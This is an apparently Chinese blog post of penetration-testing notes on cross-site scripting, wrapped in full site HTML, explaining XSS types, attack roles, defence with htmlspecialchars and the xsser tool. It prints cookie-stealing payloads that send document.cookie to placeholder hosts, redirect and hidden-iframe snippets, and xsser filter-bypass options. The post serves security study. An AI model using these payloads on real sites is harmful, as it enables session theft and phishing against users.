@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Web安全,渗透测试,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Web渗透_XSS漏洞简介 攻击Web客户端 漏洞存在于服务器端，但被攻击却是客户端用户 层级结构 客户端 web服务器 应用程序服务器 数据库服务器">
+<meta name="keywords" content="Web安全,渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web渗透-XSS漏洞">
+<meta property="og:url" content="http://21guns.top/2018/02/28/Web渗透-XSS漏洞/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="Web渗透_XSS漏洞简介 攻击Web客户端 漏洞存在于服务器端，但被攻击却是客户端用户 层级结构 客户端 web服务器 应用程序服务器 数据库服务器">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="javascript:alert">
+<meta property="og:image" content="http://1.1.1.1/a.jpg">
+<meta property="og:updated_time" content="2019-02-18T11:49:01.770Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web渗透-XSS漏洞">
+<meta name="twitter:description" content="Web渗透_XSS漏洞简介 攻击Web客户端 漏洞存在于服务器端，但被攻击却是客户端用户 层级结构 客户端 web服务器 应用程序服务器 数据库服务器">
+<meta name="twitter:image" content="javascript:alert">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/02/28/Web渗透-XSS漏洞/">
+
+
+
+
+
+  <title>Web渗透-XSS漏洞 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/02/28/Web渗透-XSS漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web渗透-XSS漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T19:31:33+08:00">
+                2018-02-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Web渗透-XSS漏洞"><a href="#Web渗透-XSS漏洞" class="headerlink" title="Web渗透_XSS漏洞"></a>Web渗透_XSS漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
+<li>攻击Web客户端<ul>
+<li>漏洞存在于服务器端，但被攻击却是客户端用户</li>
+<li>层级结构<ul>
+<li>客户端</li>
+<li>web服务器</li>
+<li>应用程序服务器</li>
+<li>数据库服务器<a id="more"></a></li>
+</ul>
+</li>
+<li>xss便是针对客户端，而sql注入针对数据库服务器</li>
+</ul>
+</li>
+<li>客户端脚本语言<ul>
+<li>可用于弹窗告警、广告</li>
+<li>主要：Javascript</li>
+<li>其它小众：Vbscript，ActiveX，flash</li>
+<li>浏览器上执行</li>
+<li>其它<ul>
+<li>服务器端存在大部分代码，为缓解其压力，部分代码交由客户端，由客户端浏览器执行，如js</li>
+<li>客户端浏览器访问服务端，其会响应html、xss、jpg、js等，其中js便可在本地执行，如判断密码长度等</li>
+<li>H向服务端注入恶意js代码，可以临时注入或者永久注入，服务端过滤不严格，当U访问时，会在本机执行H注入的恶意代码</li>
+<li>js代码在浏览器权限是受限制的，不至于为所欲为的地步</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>XSS<ul>
+<li>跨站脚本漏洞，所谓跨站，两层含义<ul>
+<li>H利用服务端漏洞，而间接攻击客户端U</li>
+<li>U的js脚本原本是由服务器下发，而攻击后运行却是的H的恶意脚本（属第三方脚本，即其它来源的脚本</li>
+</ul>
+</li>
+<li>过程<ul>
+<li>H向服务器端注入恶意脚本代码</li>
+<li>通过web站点漏洞，服务器将恶意代码交由U，代码执行，实现对U的控制</li>
+</ul>
+</li>
+<li>盗取cookie<ul>
+<li>U在线</li>
+<li>恶意js代码下载到U本机</li>
+<li>js代码执行，将U的cookie发往远程的H的服务器</li>
+</ul>
+</li>
+<li>重定向<ul>
+<li>js代码将网站重定向到H的恶意网站</li>
+<li>H的恶意网站与正常网站十分相似</li>
+<li>诱使U输入账号密码登录</li>
+<li>达到钓鱼效果</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><ul>
+<li>与Java语言无关</li>
+<li>命名完全出于市场原因</li>
+<li>最流行，使用最广的客户端脚本语言</li>
+</ul>
+<h2 id="xss使用场景"><a href="#xss使用场景" class="headerlink" title="xss使用场景"></a>xss使用场景</h2><ul>
+<li>直接嵌入html：<script>alert ()</script></li>
+<li>事件标签：<body onload="alert" ()></body></li>
+<li>图片标签：<img src="JavaScript:alert" ()></li>
+<li>其它标签：iframe，div，link</li>
+<li>DOM对象，篡改页面内容</li>
+</ul>
+<h2 id="攻击参与方"><a href="#攻击参与方" class="headerlink" title="攻击参与方"></a>攻击参与方</h2><ul>
+<li>攻击者H</li>
+<li>被攻击者U</li>
+<li>漏洞站点</li>
+<li>第三方站点<ul>
+<li>攻击参与站<ul>
+<li>如H的xss平台</li>
+<li>如重定向后的钓鱼站点</li>
+</ul>
+</li>
+<li>其它攻击目标<ul>
+<li>js将控制客户端，对其它网站进行访问</li>
+<li>若流量过大，造成DDos效果</li>
+<li>A是大站，存在xss，js将流量导至小站B，B扛不住</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="漏洞形成的根源"><a href="#漏洞形成的根源" class="headerlink" title="漏洞形成的根源"></a>漏洞形成的根源</h2><ul>
+<li>服务器对用户提交数据过滤不严格</li>
+<li>提交给服务器的脚本直接返回给其他客户端执行</li>
+<li>脚本在客户端进行恶意操作</li>
+</ul>
+<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul>
+<li>反射型（非持久性</li>
+<li>存储型xss（持久型<ul>
+<li>长期存储于服务端（数据库</li>
+<li>典型场景留言板</li>
+<li>每次用户访问都会被执行javascript脚本</li>
+<li>其它同反射型类似</li>
+</ul>
+</li>
+<li>DOM型</li>
+</ul>
+<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><ul>
+<li>检测xss是否存在<ul>
+<li><script>alert ()</script></li>
+<li><a href>type</a></li>
+<li><img src="http://1.1.1.1/a.jpg" alt="img"></li>
+</ul>
+</li>
+<li>利用xss可做到<ul>
+<li><script>window.location=‘http://1.1.1.1/’</script></li>
+<li><iframe src="xxx" height="0" width="0"></iframe> - 不仅js，也可以插入iframe标签，img标签等 - 只要是对外部网站进行访问，都可用于重定向</li>
+<li><script>new Image().src=xxx+document.cookie;</script></li>
+<li><script>document.body.innerHTML=xxx</script></li>
+</ul>
+</li>
+<li>注意<ul>
+<li>直接注入js代码太过麻烦（万一js代码量巨大</li>
+<li>注入js脚本地址，大量代码写在脚本中</li>
+<li>如盗取cookie的脚本<ul>
+<li><script> src=http://xxx/a.js </script></li>
+<li>a.js源码<ul>
+<li>var img =new Image();</li>
+<li>img.src=“<a href="http://xxx/cookie.php?cookie=%E2%80%9C+document.cookie" target="_blank" rel="noopener">http://xxx/cookie.php?cookie=“+document.cookie</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="漏洞测试简单思路"><a href="#漏洞测试简单思路" class="headerlink" title="漏洞测试简单思路"></a>漏洞测试简单思路</h2><ul>
+<li>客户端向服务器端输入数据（或代码</li>
+<li>在响应页面搜索输入的数据</li>
+<li>服务器端原样返回给客户端，则判断存在（或经过简单过滤后</li>
+<li>客户端输入与服务端输出是否一致的问题</li>
+<li>尽量找出所有可提交的变量，逐一测试</li>
+</ul>
+<h2 id="键盘记录功能"><a href="#键盘记录功能" class="headerlink" title="键盘记录功能"></a>键盘记录功能</h2><ul>
+<li>keylogger.js</li>
+<li>keylogger.php</li>
+<li>具体代码自行百度</li>
+</ul>
+<h2 id="xss防御相关"><a href="#xss防御相关" class="headerlink" title="xss防御相关"></a>xss防御相关</h2><ul>
+<li>htmlspecialchars()<ul>
+<li>输出html编码</li>
+<li>&lt;变为&lt; &gt;变为&gt;</li>
+<li>比较有效的防御措施（但也不存在绝对</li>
+</ul>
+</li>
+</ul>
+<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><ul>
+<li>严格来讲，也是一种反射型</li>
+<li>DOM，文档对象模型，即一套js和其它语言能调用的标准API</li>
+<li>结构及原理<ul>
+<li>一个html页面为Page，其下有element</li>
+<li>对应于一个Document object下有object</li>
+<li>各子object有其属性、方法、时间</li>
+<li>属性有get、set方法，方法有add、del方法</li>
+<li>各种方法可封装为API，供js等语言调用</li>
+<li>js调用API更改页面时，无须向服务器发送请求，本地即可实现</li>
+</ul>
+</li>
+<li>利用方法举例<ul>
+<li><script>var img = document.createElement(‘img’);img.src=‘http://xx.com/‘ + document.cookie </script></li>
+<li>同一般思路一样，带cookie访问H服务器</li>
+<li>只不过采取dom相关方法创建img对象</li>
+</ul>
+</li>
+</ul>
+<h2 id="工具xsser"><a href="#工具xsser" class="headerlink" title="工具xsser"></a>工具xsser</h2><ul>
+<li><p>简介</p>
+<ul>
+<li>xsser —gtk：图形化启动，鸡肋，不建议</li>
+<li>python编写</li>
+<li>支持命令行和图形化（建议命令行</li>
+</ul>
+</li>
+<li><p>绕过服务器端对输入的绕过</p>
+<ul>
+<li>十进制/十六进制 编码</li>
+<li>unescape等函数</li>
+</ul>
+</li>
+<li><p>xsser -u “</p>
+<p><a href="http://xxx.com/a”" target="_blank" rel="noopener">http://xxx.com/a”</a></p>
+</li>
+</ul>
+<p>  -g “b/index.php?name=” —cookie=xxx -s -v —reverse-check</p>
+<ul>
+<li>u：跟URL地址（不完整，与-g组合成完整的</li>
+<li>-g：表get类型（当前文件+其所带参数+其所在目录</li>
+<li>—cookie：身份验证后才可以访问，需加cookie</li>
+<li>-s：即sum，输出统计信息（测试了几次等</li>
+<li>-v：显示详细信息</li>
+<li>—reverse-check：上传一个反向连接的js脚本，若服务端反向连接xsser所在主机，则证明js已运行，则存在xss</li>
+</ul>
+<ul>
+<li><p>常用选项</p>
+<ul>
+<li>对payload编码，绕过服务器端过滤（可多选<ul>
+<li>—str：利用string.fromcharcode函数</li>
+<li>—une：利用unescape函数</li>
+<li>—mix：str和une结合</li>
+<li>—dec：十进制编码</li>
+<li>—hex：十六进制编码</li>
+<li>—hes：十六进制，带分号</li>
+<li>-dwo：对出现过的IP地址，dword编码</li>
+<li>—doo：对出现的IP地址，octal编码</li>
+<li>—cem：如—cem=‘mix,dec,doo’，可多选，视情况而定</li>
+</ul>
+</li>
+<li>注入技术（可多选<ul>
+<li>—coo：对cookie进行注入</li>
+<li>—xsa：对agent</li>
+<li>—xsr：对referer</li>
+<li>—dcp：数据控制协议的注入</li>
+<li>—dom：对dom对象进行注入</li>
+<li>—ind：</li>
+<li>—anchor：</li>
+<li>—phpids：</li>
+</ul>
+</li>
+<li>—heuristic：检查被过滤的字符</li>
+<li>—doss：对服务器的拒绝服务攻击</li>
+<li>—dos：对客户端的拒绝服务攻击</li>
+<li>—b64：base64的编码</li>
+<li>—onm：onmousemove，移动鼠标时，才会触发脚本</li>
+<li>—ifr：iframe的相关的注入</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/28/Web渗透-基础知识/" rel="next" title="Web渗透-基础知识">
+                <i class="fa fa-chevron-left"></i> Web渗透-基础知识
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/28/白帽子讲Web笔记/" rel="prev" title="白帽子讲Web笔记">
+                白帽子讲Web笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web渗透-XSS漏洞"><span class="nav-text">Web渗透_XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Javascript"><span class="nav-text">Javascript</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss使用场景"><span class="nav-text">xss使用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击参与方"><span class="nav-text">攻击参与方</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞形成的根源"><span class="nav-text">漏洞形成的根源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分类"><span class="nav-text">漏洞分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞POC"><span class="nav-text">漏洞POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞测试简单思路"><span class="nav-text">漏洞测试简单思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘记录功能"><span class="nav-text">键盘记录功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss防御相关"><span class="nav-text">xss防御相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM型xss"><span class="nav-text">DOM型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具xsser"><span class="nav-text">工具xsser</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
